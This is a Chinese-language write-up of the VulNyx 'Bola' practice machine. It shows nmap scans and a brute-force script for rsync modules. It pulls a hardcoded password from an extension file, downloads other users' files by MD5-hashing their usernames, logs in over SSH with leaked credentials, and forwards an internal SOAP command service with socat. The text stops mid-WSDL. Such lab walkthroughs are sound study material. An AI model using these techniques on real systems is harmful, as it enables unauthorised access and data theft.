{"pageProps":{"postData":{"id":"VulnyxBola","contentHtml":"<h1>Bola</h1>\n<blockquote>\n<p>Difficulty: <strong>Medium</strong></p>\n</blockquote>\n<h2>信息收集</h2>\n<p><code>20</code>是靶机</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/Anon]\n└─# nmap -sP 192.168.56.0/24                  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:22 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00028s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00023s latency).\nMAC Address: 08:00:27:42:FA:76 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.20\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:D4:18:88 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 28.11 seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Anon]\n└─<span class=\"hljs-comment\"># nmap -sT -min-rate 10000 -p- 192.168.56.20</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-08 07:<span class=\"hljs-number\">23</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.20</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00088</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp  <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp  <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">873</span>/tcp <span class=\"hljs-built_in\">open</span>  rsync\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:D4:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">88</span> (Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">17.57</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/Anon]\n└─# nmap -sT -A -T4 -O -p 22,80,873 192.168.56.20\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:25 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.20\nHost is up (0.00052s latency).\n\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\n| ssh-hostkey: \n|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)\n|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)\n80/tcp  open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Did not follow redirect to http://bola.nyx\n873/tcp open  rsync   (protocol version 32)\nMAC Address: 08:00:27:D4:18:88 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.52 ms 192.168.56.20\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 21.51 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/Anon]\n└─# nmap -script=vuln -p 22,80,873 192.168.56.20\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:26 EST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.20\nHost is up (0.00037s latency).\n\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n873/tcp open  rsync\nMAC Address: 08:00:27:D4:18:88 (Oracle VirtualBox virtual NIC)\n</span></code></pre>\n<p>还没打过<code>873</code>端口，优先级<code>80</code> > <code>873</code> > <code>22</code></p>\n<h2>web渗透</h2>\n<p>需要将<code>bola.nyx</code> 写入<code>hosts</code>文件，访问主页，没有任何信息</p>\n<p><img src=\"/post-images/VulnyxBola/image7.png\" alt=\"image.png\"></p>\n<p>尝试了注册，但是貌似是假的</p>\n<h2>rsync</h2>\n<blockquote>\n<p><code>rsync</code> 是一个常用的 <code>Linux</code> 应用程序，用于文件同步.它可以在本地计算机与远程计算机之间，或者两个本地目录之间同步文件（但不支持两台远程计算机之间的同步）。它也可以当作文件复制工具，替代<code>cp</code>和<code>mv</code>命令.它名称里面的<code>r</code>指的是 <code>remote</code>，<code>rsync</code> 其实就是\"远程同步\"（remote sync）的意思</p>\n</blockquote>\n<p>之前没遇到过这个服务，语法大概就是：</p>\n<pre><code class=\"hljs language-bash\">rsync -av rsync://&#x3C;IP>/&#x3C;路径>\n</code></pre>\n<p>假如访问了不存在的模块就会提示：</p>\n<pre><code class=\"hljs language-bash\">@ERROR: Unknown module <span class=\"hljs-string\">'src'</span>\nrsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.3.0]\n</code></pre>\n<p>加入成功连接那就会回显：</p>\n<pre><code class=\"hljs language-bash\">data      Data directory\nbackup    Backup files\n</code></pre>\n<p>那么就可以写一个脚本，来爆破目录了（脚本由<code>GPT</code>提供）</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/bin/bash</span>\n\n<span class=\"hljs-comment\"># 字典文件路径</span>\nDICT_FILE=<span class=\"hljs-string\">\"/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\"</span>\n\nRSYNC_SERVER=<span class=\"hljs-string\">\"192.168.56.20\"</span>\n\n<span class=\"hljs-comment\"># 读取字典文件逐行爆破</span>\n<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> -r <span class=\"hljs-built_in\">dir</span>; <span class=\"hljs-keyword\">do</span>\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"尝试模块: <span class=\"hljs-variable\">$dir</span>\"</span>\n\n  <span class=\"hljs-comment\"># 执行 rsync 测试</span>\n  result=$(rsync rsync://<span class=\"hljs-variable\">$RSYNC_SERVER</span>/<span class=\"hljs-variable\">$dir</span> 2>&#x26;1)\n\n  <span class=\"hljs-comment\"># 检查是否包含错误或为空</span>\n  <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$result</span>\"</span> == *<span class=\"hljs-string\">\"error\"</span>* || -z <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$result</span>\"</span> ]]; <span class=\"hljs-keyword\">then</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[失败] 模块 '<span class=\"hljs-variable\">$dir</span>' 不存在或无内容，跳过...\"</span>\n  <span class=\"hljs-keyword\">else</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[成功] 找到有效模块: '<span class=\"hljs-variable\">$dir</span>'\"</span>\n    <span class=\"hljs-built_in\">break</span>\n  <span class=\"hljs-keyword\">fi</span>\n\n<span class=\"hljs-keyword\">done</span> &#x3C; <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$DICT_FILE</span>\"</span>\n\n</code></pre>\n<p>经过爆破得到一个可用模块<code>extensions</code></p>\n<pre><code class=\"hljs language-bash\">尝试模块: extensions\n[成功] 找到有效模块: <span class=\"hljs-string\">'extensions'</span>\n</code></pre>\n<p>访问一下，能看到存在一个<code>PDF</code>和压缩包，然后将两个文件都拉取下来</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/Bola]\n└─# rsync -av rsync://192.168.56.20/extensions                   \nreceiving incremental file list\ndrwxr-xr-x          4,096 2025/02/05 11:43:23 .\n-rw-r--r--         93,553 2025/02/05 10:42:57 Password_manager_FirefoxExtension-VulNyx.pdf\n-rw-r--r--         30,811 2025/02/05 10:31:41 password_manager.zip\n\nsent 20 bytes  received 137 bytes  314.00 bytes/sec\ntotal size is 124,364  speedup is 792.13\n\n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/Bola]\n└─# rsync -av rsync://192.168.56.20/extensions/Password_manager_FirefoxExtension-VulNyx.pdf ./\nreceiving incremental file list\nPassword_manager_FirefoxExtension-VulNyx.pdf\n\nsent 43 bytes  received 93,701 bytes  187,488.00 bytes/sec\ntotal size is 93,553  speedup is 1.00\n                                                                                  \n┌──(root㉿kali)-[~/Desktop/test/Bola]\n└─# rsync -av rsync://192.168.56.20/extensions/password_manager.zip ./\nreceiving incremental file list\npassword_manager.zip\n\nsent 43 bytes  received 30,923 bytes  20,644.00 bytes/sec\ntotal size is 30,811  speedup is 0.99\n\n</code></pre>\n<h2>信息收集 - 后台</h2>\n<p>在获得文件压缩包中的<code>background.js</code>中存在一个邮箱和密码<code>jackie0x17@nyx.com</code> `sbIJ0x9g{C3``</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/Bola/manage]\n└─# <span class=\"hljs-built_in\">cat</span> background.js                               \n// Initialize default passwords on installation\nbrowser.runtime.onInstalled.addListener(() => {\n    const defaultPasswords = [\n        { site: \"bola.nyx\", username: \"jackie0x17@nyx.com\", password: \"sbIJ0x9g{C3`\" }\n    ];\n\n    // Check if passwords already exist in storage\n    browser.storage.local.get(\"passwords\").then(result => {\n        if (!result.passwords || result.passwords.length === <span class=\"hljs-number\">0</span>) {\n            browser.storage.local.set({ passwords: defaultPasswords }).then(() => {\n                console.log(\"Default passwords initialized.\");\n            });\n        }\n    });\n});\n</code></pre>\n<p>拿到邮箱和密码后成功登陆进后台</p>\n<p><img src=\"/post-images/VulnyxBola/image8.png\" alt=\"image.png\"></p>\n<p>登陆进来就能看到存在一个<code>PDF</code>文件，再给它拉取下来，内容大概是介绍<code>WSDL</code>接口的，那么就存在<code>API</code>接口数据泄露的可能</p>\n<p>首先就是下载<code>PDF</code>文件的这个接口，爆破了了一下无结果，再看了一下我们下载的文件名</p>\n<p><code>115a2cf084dd7e70a91187f799a7d5a8.pdf</code> 将<code>115a2cf084dd7e70a91187f799a7d5a8</code> 拿出来解开，发现是登陆的用户名（根据群友提示）</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/Bola]\n└─# <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"jackie0x17\"</span> | <span class=\"hljs-built_in\">md5sum</span>\n115a2cf084dd7e70a91187f799a7d5a8  -\n</code></pre>\n<p>那么现在的思路是寻找别的用户名，将其使用<code>MD5</code>加密，然后再下载文件</p>\n<h2>查找用户名</h2>\n<p>通过一段时间扫描可以找到<code>/.well-known/</code> 目录，并且还存在<code>security.txt</code> 和<code>openid-configuration</code>两个文件</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# dirsearch -u http://bola.nyx/ -x 403 -e php,zip,txt -w Desktop/Dict/SecLists-2024.3/Discovery/Web-Content/dirsearch.txt \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 21167\n\nOutput File: /root/reports/http_bola.nyx/__25-02-09_01-49-13.txt\n\nTarget: http://bola.nyx/\n\n[01:49:13] Starting: \n[01:49:16] 200 -    1KB - /.well-known/openid-configuration                 \n[01:49:16] 200 -  115B  - /.well-known/security.txt             \n</code></pre>\n<p><code>security.txt</code></p>\n<pre><code class=\"hljs language-bash\">Contact: mailto:jackie0x17@nyx.com\nExpires: 2025-08-20T10:12:00.000Z\nPreferred-Languages: en, es\n</code></pre>\n<p><code>openid-configuration</code>是<code>Json</code> 数据，发现了三个用户名：<code>d4t4s3c</code>和<code>jackie0x17</code>以及<code>ct014</code></p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# curl http://bola.nyx/.well-known/openid-configuration                                                     \n{                \n    <span class=\"hljs-string\">\"issuer\"</span>: <span class=\"hljs-string\">\"https:\\/\\/bola.nyx\"</span>,\n    <span class=\"hljs-string\">\"authorization_endpoint\"</span>: <span class=\"hljs-string\">\"https:\\/\\/bola.nyx\\/auth\"</span>,\n    <span class=\"hljs-string\">\"token_endpoint\"</span>: <span class=\"hljs-string\">\"https:\\/\\/bola.nyx\\/token\"</span>,\n    <span class=\"hljs-string\">\"userinfo_endpoint\"</span>: <span class=\"hljs-string\">\"https:\\/\\/bola.nyx\\/userinfo\"</span>,\n    <span class=\"hljs-string\">\"jwks_uri\"</span>: <span class=\"hljs-string\">\"https:\\/\\/bola.nyx\\/jwks.json\"</span>,\n    <span class=\"hljs-string\">\"response_types_supported\"</span>: [\n        <span class=\"hljs-string\">\"code\"</span>,                 \n        <span class=\"hljs-string\">\"token\"</span>,                 \n        <span class=\"hljs-string\">\"id_token\"</span>                                                            \n    ],    \n    <span class=\"hljs-string\">\"grant_types_supported\"</span>: [\n        <span class=\"hljs-string\">\"authorization_code\"</span>,\n        <span class=\"hljs-string\">\"implicit\"</span>          \n    ],                              \n    <span class=\"hljs-string\">\"subject_types_supported\"</span>: [\n        <span class=\"hljs-string\">\"public\"</span>\n    ],                                 \n    <span class=\"hljs-string\">\"id_token_signing_alg_values_supported\"</span>: [\n        <span class=\"hljs-string\">\"RS256\"</span>    \n    ],\n  <span class=\"hljs-string\">\"scopes_supported\"</span>: [                                                     \n        <span class=\"hljs-string\">\"openid\"</span>,                                                             \n        <span class=\"hljs-string\">\"profile\"</span>,                                                            \n        <span class=\"hljs-string\">\"email\"</span>                                                               \n    ],                           \n    <span class=\"hljs-string\">\"claims_supported\"</span>: [              \n        <span class=\"hljs-string\">\"sub\"</span>,      \n        <span class=\"hljs-string\">\"name\"</span>,                        \n        <span class=\"hljs-string\">\"email\"</span>    \n    ],                                                                                                                                                       \n    <span class=\"hljs-string\">\"userinfo\"</span>: [\n        {                          \n            <span class=\"hljs-string\">\"sub\"</span>: <span class=\"hljs-string\">\"d4t4s3c\"</span>,                                                 \n            <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"d4t4s3c\"</span>,                                                \n            <span class=\"hljs-string\">\"email\"</span>: <span class=\"hljs-string\">\"d4t4s3c@nyx.com\"</span>                                        \n        },                                                                    \n        {                        \n            <span class=\"hljs-string\">\"sub\"</span>: <span class=\"hljs-string\">\"jackie0x17\"</span>,\n            <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"jackie0x17\"</span>,\n            <span class=\"hljs-string\">\"email\"</span>: <span class=\"hljs-string\">\"jackie0x17@nyx.com\"</span>                                     \n        },\n        {                     \n            <span class=\"hljs-string\">\"sub\"</span>: <span class=\"hljs-string\">\"ct0l4\"</span>,  \n            <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"ct0l4\"</span>,\n            <span class=\"hljs-string\">\"email\"</span>: <span class=\"hljs-string\">\"ct0l4@nyx.com\"</span>\n        }                       \n    ]           \n}                                      \n</code></pre>\n<h2>文件下载</h2>\n<p>其中<code>d4t4s3c</code> 是靶机作者的名称，我们尝试使用他的用户名来突破</p>\n<p>将其经过<code>base64</code>加密，然后进行文件下载，果然有内容</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"d4t4s3c\"</span> | <span class=\"hljs-built_in\">md5sum</span>\n97035ded598faa2ce8ff63f7f9dd3b70  -\n</code></pre>\n<p><img src=\"/post-images/VulnyxBola/image9.png\" alt=\"image.png\"></p>\n<p>将会文件下载，内容大概是<code>WSDL Server VulNyx - How to Connect</code> ，在下面能找到哦一个用户名和密码：<code>admin</code> <code>VulNyxtestinglogin123</code></p>\n<p>根据内容，<code>SOAP</code> 服务将在 <code>http://localhost:9000</code> 上启动，可以通过访问 <code>http://localhost:9000/?wsdl</code> 查看服务的 <code>WSDL</code> 文件，在外部构造访问无果。</p>\n<h2>靶机信息收集</h2>\n<p>得到的用户名密码，尝试了加上邮箱后缀后登录后台，失败。</p>\n<p>使用用户名：<code>d4t4s3c</code> 密码：<code>VulNyxtestinglogin123</code> 登录<code>SSH</code>成功，没有<code>sudo</code></p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# ssh d4t4s3c@192.168.56.20      \nd4t4s3c@192.168.56.20<span class=\"hljs-string\">'s password: \nLinux bola 6.1.0-30-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Feb  6 09:33:51 2025 from 192.168.1.50\nd4t4s3c@bola:~$ \n</span></code></pre>\n<pre><code class=\"hljs language-bash\">d4t4s3c@bola:~$ <span class=\"hljs-built_in\">id</span>\nuid=1000(d4t4s3c) gid=1000(pijusmagnifikus) <span class=\"hljs-built_in\">groups</span>=1000(pijusmagnifikus),1003(d4t4s3c)\nd4t4s3c@bola:~$ <span class=\"hljs-built_in\">uname</span> -a\nLinux bola 6.1.0-30-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64 GNU/Linux</span>\nd4t4s3c@bola:~$ ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp0s17: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 08:00:27:d4:18:88 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.56.20/24 brd 192.168.56.255 scope global dynamic enp0s17\n       valid_lft 496sec preferred_lft 496sec\n    inet6 fe80::a00:27ff:fed4:1888/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\nd4t4s3c@bola:~$ \n</code></pre>\n<p>根据上面的的<code>PDF</code>的信息，查看一下当前系统运行的情况。和<code>PDF</code>上的一样运行在<code>9000</code>端口</p>\n<pre><code class=\"hljs language-bash\">d4t4s3c@bola:~$ ss -plntu\nNetid          State           Recv-Q          Send-Q                     Local Address:Port                     Peer Address:Port          Process          \nudp            UNCONN          0               0                                0.0.0.0:68                            0.0.0.0:*                              \ntcp            LISTEN          0               5                                0.0.0.0:873                           0.0.0.0:*                              \ntcp            LISTEN          0               5                              127.0.0.1:9000                          0.0.0.0:*                              \ntcp            LISTEN          0               80                             127.0.0.1:3306                          0.0.0.0:*                              \ntcp            LISTEN          0               128                              0.0.0.0:22                            0.0.0.0:*                              \ntcp            LISTEN          0               5                                   [::]:873                              [::]:*                              \ntcp            LISTEN          0               128                                 [::]:22                               [::]:*                              \ntcp            LISTEN          0               511                                    *:80                                  *:*                              \n</code></pre>\n<h2>提权</h2>\n<p>使用<code>socat</code>将端口转发到<code>1234</code>端口，让外网能通过<code>1234</code>端口访问</p>\n<pre><code class=\"hljs language-bash\">d4t4s3c@bola:~$ ./socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:9000 &#x26;\n[1] 1219\nd4t4s3c@bola:~$ ss -plntu\nNetid       State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       Process                                \nudp         UNCONN        0             0                          0.0.0.0:68                      0.0.0.0:*                                                 \ntcp         LISTEN        0             5                          0.0.0.0:873                     0.0.0.0:*                                                 \ntcp         LISTEN        0             5                        127.0.0.1:9000                    0.0.0.0:*                                                 \ntcp         LISTEN        0             80                       127.0.0.1:3306                    0.0.0.0:*                                                 \ntcp         LISTEN        0             5                          0.0.0.0:1234                    0.0.0.0:*           <span class=\"hljs-built_in\">users</span>:((\"socat\",pid=<span class=\"hljs-number\">1219</span>,fd=<span class=\"hljs-number\">5</span>))       \ntcp         LISTEN        0             128                        0.0.0.0:22                      0.0.0.0:*                                                 \ntcp         LISTEN        0             5                             [::]:873                        [::]:*                                                 \ntcp         LISTEN        0             128                           [::]:22                         [::]:*                                                 \ntcp         LISTEN        0             511                              *:80                            *:*       \n</code></pre>\n<p><img src=\"/post-images/VulnyxBola/image10.png\" alt=\"image.png\"></p>\n<p>访问<code>bola.nyx:1234/wsdl</code> ，抓包，得到<code>wsdl</code>接口定义</p>\n<pre><code class=\"hljs language-xml\"><span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">definitions</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"VulNyxSOAP\"</span>\n   <span class=\"hljs-attr\">targetNamespace</span>=<span class=\"hljs-string\">\"http://localhost/wsdl/VulNyxSOAP.wsdl\"</span>\n   <span class=\"hljs-attr\">xmlns</span>=<span class=\"hljs-string\">\"http://schemas.xmlsoap.org/wsdl/\"</span>\n   <span class=\"hljs-attr\">xmlns:soap</span>=<span class=\"hljs-string\">\"http://schemas.xmlsoap.org/wsdl/soap/\"</span>\n   <span class=\"hljs-attr\">xmlns:tns</span>=<span class=\"hljs-string\">\"http://localhost/wsdl/VulNyxSOAP.wsdl\"</span>\n   <span class=\"hljs-attr\">xmlns:xsd</span>=<span class=\"hljs-string\">\"http://www.w3.org/2001/XMLSchema\"</span>></span>\n\n   <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">message</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"LoginRequest\"</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">part</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"username\"</span> <span class=\"hljs-attr\">element</span>=<span class=\"hljs-string\">\"username\"</span>/></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">part</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"password\"</span> <span class=\"hljs-attr\">element</span>=<span class=\"hljs-string\">\"password\"</span>/></span>\n   <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">message</span>></span>\n\n   <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">message</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"LoginResponse\"</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">part</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"status\"</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"string\"</span>/></span>\n   <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">message</span>></span>\n\n   <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">message</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"ExecuteCommandRequest\"</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">part</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"cmd\"</span> <span class=\"hljs-attr\">element</span>=<span class=\"hljs-string\">\"cmd\"</span>/></span>\n   <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">message</span>></span>\n\n   <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">message</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"ExecuteCommandResponse\"</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">part</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"output\"</span> <span class=\"hljs-attr\">element</span>=<span class=\"hljs-string\">\"cmd\"</span>/></span>\n   <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">message</span>></span>\n\n   <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">portType</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"VulNyxSOAPPortType\"</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">operation</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"Login\"</span>></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">message</span>=<span class=\"hljs-string\">\"tns:LoginRequest\"</span>/></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">output</span> <span class=\"hljs-attr\">message</span>=<span class=\"hljs-string\">\"tns:LoginResponse\"</span>/></span>\n      <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">operation</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">operation</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"ExecuteCommand\"</span>></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">message</span>=<span class=\"hljs-string\">\"tns:ExecuteCommandRequest\"</span>/></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">output</span> <span class=\"hljs-attr\">message</span>=<span class=\"hljs-string\">\"tns:ExecuteCommandResponse\"</span>/></span>\n      <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">operation</span>></span>\n   <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">portType</span>></span>\n\n   <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">binding</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"VulNyxSOAPBinding\"</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"tns:VulNyxSOAPPortType\"</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">soap:binding</span> <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\">\"rpc\"</span>\n         <span class=\"hljs-attr\">transport</span>=<span class=\"hljs-string\">\"http://schemas.xmlsoap.org/soap/http\"</span>/></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">operation</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"Login\"</span>></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">soap:operation</span> <span class=\"hljs-attr\">soapAction</span>=<span class=\"hljs-string\">\"Login\"</span>/></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">input</span>></span>\n            <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">soap:body</span> <span class=\"hljs-attr\">use</span>=<span class=\"hljs-string\">\"literal\"</span>/></span>\n         <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">input</span>></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">output</span>></span>\n            <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">soap:body</span> <span class=\"hljs-attr\">use</span>=<span class=\"hljs-string\">\"literal\"</span>/></span>\n         <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">output</span>></span>\n      <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">operation</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">operation</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"ExecuteCommand\"</span>></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">soap:operation</span> <span class=\"hljs-attr\">soapAction</span>=<span class=\"hljs-string\">\"ExecuteCommand\"</span>/></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">input</span>></span>\n            <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">soap:body</span> <span class=\"hljs-attr\">use</span>=<span class=\"hljs-string\">\"literal\"</span>/></span>\n         <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">input</span>></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">output</span>></span>\n            <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">soap:body</span> <span class=\"hljs-attr\">use</span>=<span 